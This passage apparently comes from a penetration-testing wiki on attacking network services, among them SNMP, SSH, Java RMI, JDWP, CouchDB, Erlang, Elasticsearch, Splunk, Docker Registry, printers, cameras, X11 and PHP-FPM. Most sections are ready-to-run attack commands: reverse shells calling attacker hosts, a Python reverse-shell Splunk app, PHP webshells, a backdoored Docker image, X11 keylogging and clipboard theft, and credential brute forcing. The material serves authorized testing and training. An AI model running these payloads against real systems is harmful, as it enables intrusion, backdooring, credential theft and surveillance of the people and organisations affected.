-- Write a text file (one-liner only; COPY cannot emit newlines or clean binary)
COPY (SELECT convert_from(decode('<BASE64>','base64'),'utf-8')) TO '/var/www/html/shell.php';

-- Binary file move via large objects
SELECT lo_import('/etc/passwd', 13337);
SELECT lo_export(13338, '/var/lib/postgresql/13/main/base/3/1337');
```

---

## VNC 5900 no-auth access and stored password decryption

VNC (ports 5800/5801/5900/5901) may allow connection with no authentication, or use a
weak fixed-key 3DES scheme for the stored password in `~/.vnc/passwd`. That 3DES key was
reversed years ago, so any recovered `passwd` blob is trivially decryptable.

```bash
# Enumerate + check for no-auth / RealVNC auth-bypass
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 <IP>
msf> use auxiliary/scanner/vnc/vnc_none_auth

# Connect (Kali)
vncviewer <IP>::5900
vncviewer -passwd passwd.txt <IP>::5901

# Decrypt a captured ~/.vnc/passwd (fixed-key 3DES; https://github.com/jeroennijhof/vncpwd)
make && ./vncpwd <passwd_file>
```

---

## SSH 22 username enumeration and credential brute force

Some OpenSSH versions leak valid usernames via a timing side channel (CVE-2018-15473).
After building a user list, spray default/common SSH creds (vendor tables in
wiki/cheatsheets/default-credentials.md). Check offered auth methods first to know
whether password auth is even enabled.

```bash
# Auth methods + host keys
nmap -p22 <IP> --script ssh-auth-methods --script-args="ssh.user=root"
ssh -v <user>@<IP> -o PreferredAuthentications=password

# Username enumeration (timing, CVE-2018-15473)
msf> use scanner/ssh/ssh_enumusers

# Brute force / spray
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4 -f
# vendor default SSH creds wordlist: SecLists ssh-betterdefaultpasslist.txt
```

---

## SSH 22 private-key attacks (weak Debian PRNG, known keys)

If password auth is off, key auth may still be brute-forceable. Keys generated on
Debian/Ubuntu systems with the 2006-2008 predictable-PRNG bug come from a tiny keyspace
and are pre-computed. Known deployed/backdoor keys are catalogued in ssh-badkeys. You
can also test whether a set of candidate public keys is accepted before you hold the
private key.

```bash
# Test which candidate pubkeys the server will accept (no private key needed)
nmap -p22 --script ssh-publickey-acceptance --script-args \
  "publickeys={'./id_rsa1.pub','./id_rsa2.pub'}" <IP>
msf> use scanner/ssh/ssh_identify_pubkeys

# Weak Debian PRNG precomputed keys: https://github.com/g0tmi1k/debian-ssh
# Known bad/backdoor keys:            https://github.com/rapid7/ssh-badkeys
# Brute a private key against the host (legacy algs enabled): snowdroppe/ssh-keybrute

# Crack a passphrase-protected private key you already recovered
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

## SSH 22 Kerberos/GSSAPI single sign-on abuse

When an SSH server supports GSSAPI (for example Windows OpenSSH on a domain controller),
a Kerberos TGT authenticates without a password. Use a stolen/obtained TGT and connect
with the FQDN that matches the host SPN, otherwise you get "Server not found in Kerberos
database".

```bash
sudo ntpdate <dc.fqdn>                 # avoid KRB_AP_ERR_SKEW
kinit <user>                           # obtain a TGT (or import a ccache)
klist
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
# crackmapexec ssh --kerberos can also use the ccache
```

---

## SNMP 161 RCE via NET-SNMP-EXTEND-MIB (write community)

A read-write community string (`rwcommunity`) on a Net-SNMP agent lets you append rows to
the `nsExtendObjects` table with `snmpset`. The agent executes the referenced binary on
read ("run-on-read"), returning stdout in `nsExtendOutputFull`. This is direct command
execution as the snmpd user (often root).

```bash
# Triage existing extend entries and read-back capability
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
# (numeric OID fallback if MIBs missing: 1.3.6.1.4.1.8072.1.3.2)

# Inject a command (run /bin/sh -c <payload>) then read output
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <COMMUNITY> <IP> \
 'nsExtendStatus."x"'  = createAndGo \
 'nsExtendCommand."x"' = /bin/sh \
 'nsExtendArgs."x"'    = '-c id'
snmpget -v2c -c <COMMUNITY> <IP> 'NET-SNMP-EXTEND-MIB::nsExtendOutputFull."x"'

# Reverse shell payload
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <COMMUNITY> <IP> \
 'nsExtendStatus."r"'  = createAndGo \
 'nsExtendCommand."r"' = /bin/sh \
 'nsExtendArgs."r"'    = '-c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"'
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

---

## Rsync 873 anonymous module read/write and authorized_keys upload

Rsync daemon modules are directory shares that may be unauthenticated. List modules, then
read or (crucially) write files. If a module maps to a user home with write access, upload
an `authorized_keys` for SSH. `AUTHREQD` in the banner means that module needs a password.

```bash
# Enumerate modules (raw or tooling)
nc -vn <IP> 873          # then send: @RSYNCD: 31.0  and  #list
nmap -sV --script rsync-list-modules -p 873 <IP>

# Anonymous list / download
rsync -av --list-only rsync://<IP>/<module>
rsync -av rsync://<IP>:873/<module> ./loot

# Authenticated (prompts for password)
rsync -av --list-only rsync://<user>@<IP>/<module>

# Upload an authorized_keys for SSH access (writable home module)
rsync -av ./ssh/ rsync://<user>@<IP>/home_user/.ssh
```

Post-access, the module secrets live in `rsyncd.conf`/`rsyncd.secrets`:
`find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)`.

---

## Java RMI enumeration and RCE (1090/1098/1099/1199/4443-4446/8999-9010)

Java RMI is an object-oriented RPC where a JVM exposes remote objects on a TCP port.
The RMI Registry (ObjID 0), Activation System (ObjID 1) and Distributed Garbage
Collector (ObjID 2) are the fixed default components; custom application objects bind
to random high ports. nmap often labels these `java-rmi` or `ssl/java-rmi`; treat any
unknown SSL service on a common RMI port as a candidate. The primary tool is
remote-method-guesser (`rmg`), which fingerprints known RMI vulnerabilities in one shot.

```bash
# Enumerate bound names, codebase, deserialization filter status, CVE-2019-2684, JEP290 bypass
rmg enum <IP> 9010

# ObjID gives service uptime (useful for version-dating the JVM)
rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
```

RMI does not let you list methods on custom objects; you must brute-force valid
signatures. Custom services usually lack the deserialization filters that protect the
default components, so a guessed method is often a direct deserialization sink.

```bash
# Guess method signatures against every bound name (uses internal + rmiscout wordlists)
rmg guess <IP> 9010

# Call a guessed method directly (here a String execute(String) returning command output)
rmg call <IP> 9010 '"id"' --bound-name plain-server \
    --signature "String execute(String dummy)" --plugin GenericPrint.jar

# Deserialization RCE against a guessed non-primitive-arg method (ysoserial gadget)
rmg serial <IP> 9010 CommonsCollections6 'nc <ATTACKER> 4444 -e /bin/sh' \
    --bound-name plain-server --signature "String execute(String dummy)"
```

If a bound name resolves to `javax.management.remote.rmi.RMIServerImpl_Stub` you have a
JMX endpoint: use beanshooter to abuse the MLet MBean (load a remote MBean = RCE) or the
post-newClient deserialization path. Also grep GitHub for the interface/impl class name;
the bound name plus class name frequently leaks the exact method set. Alternatives:
rmiscout (BishopFox), BaRMIe (NickstaDB).

---

## JDWP remote code execution (Java Debug Wire Protocol, commonly 8000)

JDWP is the unauthenticated, unencrypted debug transport a JVM exposes when started
with `-agentlib:jdwp` / `-Xdebug -Xrunjdwp`. Anyone who can reach the port can load
classes, set breakpoints, and invoke arbitrary methods, so exposure equals RCE on any
JDK version. Fingerprint by sending the 14-byte handshake and expecting it echoed back.

```bash
# Handshake probe: service echoes "JDWP-Handshake" if present
printf 'JDWP-Handshake' | nc -vn <IP> 8000

# nmap confirmation
nmap -sV --script jdwp-info,jdwp-exec -p 8000 <IP>
```

Exploit with jdwp-shellifier (IOActive). It fetches a Runtime reference, arms a
breakpoint that normal traffic will hit, then invokes `Runtime.exec` when the breakpoint
fires. Breaking on `java.lang.String.indexOf` is far more stable than the default
`ServerSocket.accept` because ordinary app activity triggers it quickly.

```bash
python2 jdwp-shellifier.py -t <IP> -p 8000                       # dump JVM/system info only
python2 jdwp-shellifier.py -t <IP> -p 8000 --break-on 'java.lang.String.indexOf' \
    --cmd 'ncat -l -p 1337 -e /bin/bash'
```

For maximum reliability, drop a real backdoor binary to the host and have the JDWP exec
launch it rather than running a one-shot inline command.

---

## CouchDB privilege escalation and RCE (5984/6984)

CouchDB is a document DB with a pure-HTTP REST API. Unauthenticated instances expose the
full data set; even authenticated ones fall to a classic JSON-parser-differential admin
bypass. Enumerate over curl before anything else.

```bash
curl http://<IP>:5984/                       # banner + version, e.g. {"couchdb":"Welcome","version":"2.0.0"}
curl http://<IP>:5984/_all_dbs               # list databases (401 => need creds)
curl http://<IP>:5984/_membership            # cluster node names (needed for the RCE path below)
curl http://<IP>:5984/<db>/_all_docs         # list docs in a db
curl http://<IP>:5984/<db>/<docid>           # read a doc (creds often live here)
```

CVE-2017-12635 (Erlang vs JavaScript JSON parser differential): sending a user document
with two `roles` keys makes the validation layer see the empty one while the storage
layer keeps `["_admin"]`, creating an admin account with no prior auth.

```bash
curl -X PUT -H "Content-Type:application/json" \
  -d '{"type":"user","name":"pwn","roles":["_admin"],"roles":[],"password":"pwn"}' \
  http://<IP>:5984/_users/org.couchdb.user:pwn
```

CVE-2017-12636 (config-driven RCE): once admin, register an OS command as a query server
(v2 uses the per-node `_config` path), then trigger it via a design-doc view. Requires a
writable `local.ini` on the node.

```bash
# Register a malicious query "language" mapped to a shell command
curl -X PUT 'http://pwn:pwn@<IP>:5984/_node/couchdb@localhost/_config/query_servers/cmd' \
  -d '"/bin/bash -c '\''bash -i >& /dev/tcp/<ATTACKER>/9001 0>&1'\''"'
# Create a db, a doc, and a design doc whose language is our command
curl -X PUT 'http://pwn:pwn@<IP>:5984/df'
curl -X PUT 'http://pwn:pwn@<IP>:5984/df/zero' -d '{"_id":"HTP"}'
curl -X PUT 'http://pwn:pwn@<IP>:5984/df/_design/z' \
  -d '{"_id":"_design/z","views":{"a":{"map":""}},"language":"cmd"}'
```

CVE-2018-8007 is an alternative RCE by injecting `[os_daemons]` into `local.ini` via the
`cors/origins` config and restarting the process. Because CouchDB runs on the Erlang VM,
the strongest local privesc is often the Erlang cookie path (see next section): the HTB
Canape chain goes CVE-2017-12635 admin, then reads `~/.erlang.cookie`, then `rpc:call`
into the couchdb node as its OS user.

---

## Erlang Port Mapper Daemon and cookie RCE (4369, plus EPMD-mapped ports)

EPMD maps Erlang node names to their dynamic distribution ports. It fronts RabbitMQ,
CouchDB, Kazoo/FreeSWITCH and any distributed-Erlang app. Enumeration reveals the live
nodes and their real ports; the actual compromise hinges on the shared authentication
"cookie" (`~/.erlang.cookie`, a 20-char A-Z string by default). Any node holding the
cookie can execute code on every other node in the cluster.

```bash
# Manual node-name request over the EPMD protocol
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

# nmap dumps every registered node and its distribution port
nmap -sV -Pn -n -p 4369 --script epmd-info <IP>
```

With a leaked or brute-forced cookie, open a remote Erlang shell and run OS commands:

```bash
# Remote shell into a discovered node
erl -cookie <LEAKED_COOKIE> -name pwn@<ATTACKER> -remsh <nodename>@<target.fqdn>
# then in the Eshell:
> os:cmd("id").

# Local privesc variant (foothold user pivots into a root-owned node, e.g. couchdb)
HOME=/ erl -sname anon -setcookie <LEAKED_COOKIE>
> rpc:call('couchdb@localhost', os, cmd, ["bash -c 'bash -i >& /dev/tcp/<ATTACKER>/9005 0>&1'"]).
```

Metasploit `exploit/multi/misc/erlang_cookie_rce` automates the remote path if you have
the cookie. Weak/default cookies are brute-forceable (epmd_bf).

---

## Elasticsearch unauthenticated dump and user enumeration (9200)

Elasticsearch defaults to NO authentication, so a bare instance leaks every index over
HTTP. Distinguish the three states: `/` returns cluster JSON (open), a `500` about
`xpack.security.enabled` (open, security never turned on), or a `401` with
`WWW-Authenticate: Basic` (auth on, brute-force it). Default users to try:
`elastic` (superuser, old default password `changeme`), `kibana`, `logstash_system`,
`beats_system`, `remote_monitoring_user`.

```bash
curl http://<IP>:9200/                                # banner / cluster info
curl http://<IP>:9200/_cat/indices?v                  # every index, doc count, size
curl "http://<IP>:9200/_security/user"                # enumerate users (if security on + authed)
curl "http://<IP>:9200/_security/role"                # roles; look for superuser
```

Dumping data: `_search` caps at 10 rows by default, so pass `size` to pull everything an
index reports in its `hits.total`. The `q` search parameter supports regex.

```bash
curl "http://<IP>:9200/<index>/_search?pretty=true&size=1000"       # dump a full index
curl "http://<IP>:9200/_search?pretty=true"                        # dump across all indices
curl "http://<IP>:9200/_search?pretty=true&q=password"             # keyword hunt across indices
# Write test (open cluster => you can create indices; sometimes a foothold for scripted fields)
curl -X POST http://<IP>:9200/pwn/doc -H 'Content-Type: application/json' -d '{"x":"y"}'
```

Automate with `msf auxiliary/scanner/elasticsearch/indices_enum` or the
nmap-elasticsearch-nse script.

---

## Kibana access to Elasticsearch and pre-6.6 RCE (5601)

Kibana authentication is inherited entirely from Elasticsearch: if ES has security off,
Kibana is open; if creds exist they sit in `/etc/kibana/kibana.yml`. Creds that are NOT
the restricted `kibana_system` account usually grant broad ES access (data plus
Stack Management for users, roles and API keys). Once in, prioritise reading ES data and
minting an API key or superuser.

```bash
# Fingerprint + version (version drives the CVE choice)
curl -s http://<IP>:5601/api/status | grep -o '"number":"[0-9.]*"'
# Grab creds from a foothold
cat /etc/kibana/kibana.yml | grep -Ei 'username|password|elasticsearch.hosts'
```

Kibana before 6.6.0 has a Timelion prototype-pollution to RCE (CVE-2019-7609): a crafted
`.es(*)` expression pollutes a Node.js prototype so a canvas/console request spawns a
child process. Also CVE-2018-17246 (LFI-to-RCE via the Console plugin loading an
attacker JS file). Both need network reach to 5601 and a matching version; confirm the
version first, then run the public PoC for that CVE with an OOB-verified reverse shell.

---

## Splunk custom-app RCE (management port 8089, web 8000)

Splunk exposes its web UI on 8000 and the splunkd management API on 8089. Two recurring
weaknesses: the trial converts to a free tier after 60 days and the free tier has NO
authentication, and older builds ship `admin:changeme`. A Splunk app can run Python,
Bash, Batch or PowerShell, and Splunk bundles its own Python, so scripted inputs give
cross-platform RCE (works even on Windows targets with no interpreter installed).

```bash
# Fingerprint / confirm creds against the mgmt API
curl -k https://<IP>:8089/services/server/info -u admin:changeme
```

Package a malicious app: a `bin/` with the reverse-shell script and a `default/inputs.conf`
that enables it (`disabled = 0`, a short `interval`, and a `sourcetype`), then upload it
via the app-management UI. Splunk runs the scripted input on the interval automatically.

```ini
# default/inputs.conf
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

```python
# bin/rev.py  (Linux; Splunk's own python runs it)
import socket,os,pty
s=socket.socket(); s.connect(("<ATTACKER>",443))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

Start a listener, upload the app, catch the shell. On Windows use an equivalent
`run.ps1` TCPClient reverse shell. Reference package: 0xjpuff/reverse_shell_splunk. The
same primitive gives persistence and, where splunkd runs as SYSTEM/root, local privesc.

---

## Docker Registry enumeration, image loot and backdoor (5000)

A Docker Registry (Distribution API 2.0) on 5000 is HTTP(S) and often behind a proxy, so
nmap can miss it; fingerprint by hand. `/` returns nothing, `/v2/` returns `{}`,
`/v2/_catalog` lists repositories or a 401. Pulling images gives you their layers, and
layers routinely contain hardcoded secrets, source, and config.

```bash
curl -s http://<IP>:5000/v2/_catalog                       # list repos (add -k -u user:pass if auth'd)
curl -s http://<IP>:5000/v2/<repo>/tags/list               # tags for a repo
curl -s http://<IP>:5000/v2/<repo>/manifests/latest        # manifest -> blobSum layer digests
curl http://<IP>:5000/v2/<repo>/blobs/sha256:<digest> --output blob.tar
tar -xf blob.tar    # inspect each blob in its OWN dir; blobs overwrite each other otherwise
```

Automate the dump with DockerRegistryGrabber (`drg.py <url> --dump_all`). If you have a
Docker client, pull and mine the history for the build commands (which leak paths and
sometimes creds):

```bash
docker pull <IP>:5000/<repo>
docker history <IP>:5000/<repo>            # reveals COPY/RUN commands, e.g. cp mysql-setup.sh
docker run -it <IP>:5000/<repo> bash
```

Write access lets you poison images: rebuild a pulled image with a webshell or
`PermitRootLogin yes` + a known root password, then `docker push` it back so the next
deploy runs your backdoor.

```dockerfile
FROM <IP>:5000/wordpress
COPY shell.php /app/
RUN chmod 777 /app/shell.php     # shell.php: <?php echo shell_exec($_GET["cmd"]); ?>
```

---

## IPsec/IKE aggressive-mode PSK capture and cracking (500/udp, 4500/udp)

Enterprise IPsec VPNs negotiate keys via IKE over 500/udp (4500/udp for NAT-T). The
high-value bug is IKE aggressive mode with a pre-shared key: the group ID travels in the
clear and the gateway returns a PSK-derived hash that is crackable offline. First find a
transform the gateway accepts, then a valid group name, then grab and crack the hash.

```bash
nmap -sU -p 500 <IP>                                  # confirm isakmp open
ike-scan -M <IP>                                      # "1 returned handshake" => transform accepted; note Auth=PSK

# If no transform is accepted, brute-force the 8-value transform space
for E in 1 5 7/256; do for H in 1 2; do for A in 1 65001; do for G in 2 14; do
  ike-scan -M --trans=$E,$H,$A,$G <IP> | grep -B14 "1 returned handshake"; done;done;done;done
```

Aggressive mode leaks the identity pre-auth and yields a crackable PSK handshake:

```bash
ike-scan -A <IP>                                      # leaks ID(Type=..., Value=ike@corp.tld) pre-auth
ike-scan -A --pskcrack=handshake.txt <IP>             # capture the crackable PSK hash
hashcat -m 5400 handshake.txt wordlist.txt            # or psk-crack / john via ikescan2john.py
```

Brute-force the group ID with the ike-scan loop when it is unknown (SecLists
`Miscellaneous/ike-groupid.txt`), or use ikeforce. Recovered PSKs are frequently reused
as SSH/service passwords, so spray them. If XAUTH is enabled after the PSK, brute-force
user/pass with `ikeforce.py <IP> -b -i <group> -u <user> -k <PSK> -w pass.txt`, then
connect with vpnc.

---

## Network-printer raw PJL abuse: file read, upload and cred theft (9100)

Raw port 9100 (JetDirect/AppSocket/PDL) feeds bytes straight to the print engine, giving
a bidirectional channel to the PJL/PostScript/PCL interpreter. That interpreter exposes a
filesystem: you can list, read and write files on the printer, often reaching stored SMB/
LDAP/email credentials, address books and spooled documents. Interact by hand over nc,
then switch to PRET for a real shell.

```bash
nc -vn <IP> 9100
@PJL INFO ID                       # brand + firmware version
@PJL INFO VARIABLES                # env variables (may include configured creds)
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535   # list the printer filesystem
@PJL FSUPLOAD NAME="0:\..\..\etc\passwd"        # read a file off the device
```

PRET (RUB-NDS) wraps these into `ls`, `get`, `put`, `cat` plus path-traversal and NVRAM
tricks; Metasploit has `auxiliary/scanner/printer/printer_list_dir`,
`printer_download_file`, `printer_env_vars`. nmap: `--script pjl-ready-message`.

```bash
python pret.py <IP> pjl
> ls /
> get ../../etc/passwd
> nvram dump          # some models leak stored credentials from NVRAM
```

Advanced: PJL can switch languages (`@PJL ENTER LANGUAGE = XPS`) and some engines
(e.g. Canon ImageCLASS) have a memory-unsafe TrueType hinting VM reachable by shipping a
malicious font inside an XPS job over 9100, a path to firmware RCE.

---

## RTSP camera stream access and credential brute force (554, 8554)

RTSP is an HTTP-like control protocol for IP cameras and media servers. A `DESCRIBE`
request tells you the auth state: `200 OK` is unauthenticated access, `401` reveals Basic
or Digest auth. The stream path (`/live.sdp`, `/mpeg4`, vendor-specific) must be guessed
or brute-forced; once you have path plus creds, view the feed directly.

```bash
# Manual DESCRIBE probe (double CRLF required)
printf 'DESCRIBE rtsp://<IP>:554 RTSP/1.0\r\nCSeq: 2\r\n\r\n' | nc <IP> 554

nmap -sV --script "rtsp-*" -p 554 <IP>              # methods, URL discovery, brute

# View a discovered stream (TCP transport is more reliable than UDP)
ffplay -rtsp_transport tcp rtsp://<IP>/live.sdp
```

Cameradar (Ullaakut) automates the whole chain: discover RTSP hosts, dictionary-attack
both the stream route and the camera credentials, and generate thumbnails to confirm live
feeds. rtsp_authgrinder is a lighter cred brute-forcer.

```bash
cameradar -t <IP>                                   # route + credential dictionary attack
```

For P2P/cloud cameras that do not expose 554 directly, pivot to the PPPP protocol
(32100/udp).

---

## X11 unauthenticated display abuse: keylog, screenshot, input injection (6000)

An open X11 server (TCP 6000 + display number) or a reachable MIT-MAGIC-COOKIE lets an
attacker do far more than draw windows: enumerate clients, read the clipboard, screenshot
the desktop, sniff keystrokes and inject input. From a local foothold, the cookie lives
in `~/.Xauthority` (or the path in `$XAUTHORITY`, or the Xorg `-auth` argument).

```bash
nmap -sV --script x11-access -p 6000 <IP>           # test anonymous connect
# Local: locate the cookie of a running GUI session
xauth list; ps -efww | grep -E '[X]org|[X]wayland'
export XAUTHORITY=/home/<user>/.Xauthority          # then target <host>:0
```

Post-connection primitives:

```bash
xwininfo -root -tree -display <IP>:0                 # enumerate windows
xwd -root -screen -silent -display <IP>:0 > shot.xwd && convert shot.xwd shot.png   # screenshot
xspy <IP>                                            # sniff keystrokes (creds typed live)
xclip -display <IP>:0 -selection clipboard -o        # steal clipboard (tokens, pasted keys)
# Input injection -> command execution: activate a window, then type
WID=$(xdotool search --onlyvisible --name '.*' | head -n1)
xdotool windowactivate --sync "$WID"; xdotool type 'xterm &'; xdotool key Return
```

`msf exploit/unix/x11/x11_keyboard_exec` weaponises the injection into a shell; xpra can
shadow the whole display live. Activating the target window before typing beats
`--window` XSendEvent, which many apps ignore.

---

## RabbitMQ Management console abuse (15672)

When the management plugin is enabled, RabbitMQ exposes a web console/API on 15672 with
default credentials `guest:guest`. Authenticated access leaks connection metadata and,
more usefully, lets you publish arbitrary messages into queues, which can drive downstream
consumers to perform actions (send mail, attach files, trigger jobs) in a CTF/logic sense.

```bash
# Default login check
curl -s -u guest:guest http://<IP>:15672/api/overview
curl -s -u guest:guest http://<IP>:15672/api/connections     # peers + client props

# Publish a message into a queue via the API (consumer-side impact)
curl -u guest:guest -H "Content-Type: application/json" \
  -X POST http://<IP>:15672/api/exchanges/%2F/amq.default/publish \
  -d '{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1},
       "routing_key":"email","payload":"{\"to\":\"a@b.c\",\"attachments\":[{\"path\":\"/flag.txt\"}]}",
       "payload_encoding":"string"}'
```

Erlang cookie hash from `rabbitmq.conf`/mnesia can be recovered and cracked
(hashcat mode 1420 with `--hex-salt` after re-ordering the salt). RabbitMQ also runs on
the Erlang VM, so 4369/EPMD + a leaked `~/.erlang.cookie` gives the same distributed-Erlang
RCE path as CouchDB.

---

## Cisco Smart Install config exfiltration and RCE (4786)

Cisco Smart Install automates zero-touch provisioning of new switches and is ON by
default on many Catalyst devices, listening on TCP 4786. It requires no authentication:
a crafted packet can force the switch to hand over its running configuration (which
carries SNMP strings, VTY passwords, VLAN and routing detail) or, via CVE-2018-0171, a
buffer overflow enabling reboot or RCE. Config exfiltration alone maps the internal
network and yields creds for further attacks.

```bash
nmap -p 4786 --script smart-install <IP>            # detect Smart Install
# SIET (frostbits-security): -g grabs the config, -i sets the target; output lands in tftp/
python2 siet.py -g -i <IP>
```

Treat any exposed 4786 as a full config leak; grep the exfiltrated file for
`snmp-server community`, `enable secret`, `username ... password` and reuse those against
the rest of the estate.

---

## FastCGI / PHP-FPM direct RCE (9000)

PHP-FPM speaks FastCGI on 9000 and is usually bound to localhost, so you reach it after a
foothold or through an SSRF/gopher primitive; nmap tags it "unknown". If you can send
FastCGI records you get RCE, because you control the CGI params: point `SCRIPT_FILENAME`
at any existing `.php` on disk and use `PHP_VALUE` to set `auto_prepend_file` +
`allow_url_include`, injecting your payload before the real script runs.

```bash
# Probe the default status endpoint
SCRIPT_NAME=/status SCRIPT_FILENAME=/status REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect 127.0.0.1:9000

# Direct RCE: prepend a data:// payload to an existing php file
env -i \
  PHP_VALUE="allow_url_include=1"$'\n'"auto_prepend_file='data://text/plain;base64,$(echo "<?php system(\$_GET['c']); ?>"|base64)'" \
  SCRIPT_FILENAME=/var/www/html/index.php SCRIPT_NAME=/index.php REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect 127.0.0.1:9000
```

When only SSRF is available, build a raw FastCGI record stream (FCGI_PARAMS with
`auto_prepend_file=php://input`, then FCGI_STDIN carrying `<?php system('id'); ?>`) and
deliver it as `gopher://127.0.0.1:9000/_<url-encoded-bytes>`. Gopherus generates these.
Watch for the Nginx `cgi.fix_pathinfo=1` misconfig, which lets you append `/x.php` to a
static upload and reach PHP without touching 9000 directly.

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| [[nmap]] | Port scanning, service versioning, NSE scripts (ftp-anon, smtp-open-relay, smb-protocols) |
| [[metasploit]] | Exploit delivery (EternalBlue, BlueKeep, etc.) |
| [[hydra]] | Brute force — FTP, SSH, RDP, SMB, SMTP, POP3, IMAP, HTTP |
| smbclient | SMB share interaction, file download/upload |
| smbmap | SMB share enumeration with permissions |
| enum4linux-ng | Automated SMB null-session enumeration |
| CrackMapExec (CME) | SMB auth, spray, exec, hash dump, multi-host |
| impacket-psexec | SMB-based SYSTEM shell |
| impacket-ntlmrelayx | NTLM relay attacks |
| Responder | LLMNR/NBT-NS poisoning, NTLMv2 capture |
| sqlcmd / sqsh / mssqlclient.py | MSSQL interaction |
| mysql | MySQL interaction |
| dig / fierce / subfinder / subbrute | DNS enumeration and zone transfer |
| smtp-user-enum | SMTP VRFY/EXPN/RCPT user enumeration |
| swaks | SMTP testing, open relay abuse |
| o365spray | Office 365 user enum and password spray |
| snmpwalk / onesixtyone | SNMP community string brute force and MIB walk |
| crowbar | RDP password spray |
| xfreerdp | RDP client with PtH support |
| medusa | Multi-protocol brute force (FTP, SSH, SMB, etc.) |

---

## Latest Vulnerabilities Per Service

| Service | CVE | Name | Impact |
|---------|-----|------|--------|
| FTP | CVE-2022-22836 | CoreFTP path traversal | Authenticated arbitrary file write |
| SMB | CVE-2020-0796 | SMBGhost | Unauthenticated RCE (Win 10 1903/1909) |
| SMB | CVE-2017-0144 | EternalBlue | Unauthenticated RCE via SMBv1 |
| RDP | CVE-2019-0708 | BlueKeep | Unauthenticated RCE (Win 7/Server 2008) |
| SMTP | CVE-2020-7247 | OpenSMTPD RCE | Pre-auth RCE via sender field injection |
| MySQL | CVE-2012-2122 | MySQL auth bypass | Timing attack auth bypass |
| DNS | — | Subdomain takeover | Phishing, CORS abuse, cookie theft at scale |

---

## Sources

- CPTS Module 116: Attacking Common Services (HTB Academy)
- THM Skynet room — SMB null session + hydra + CMS exploitation chain
- THM Fowsniff CTF — POP3 brute force + email-based credential extraction
- THM GoldenEye — POP3 multi-stage pivot + kernel exploit
- THM IDE — vsftpd anonymous FTP + Codiad RCE + service privesc
- THM BiteMe — Fail2ban abuse for root
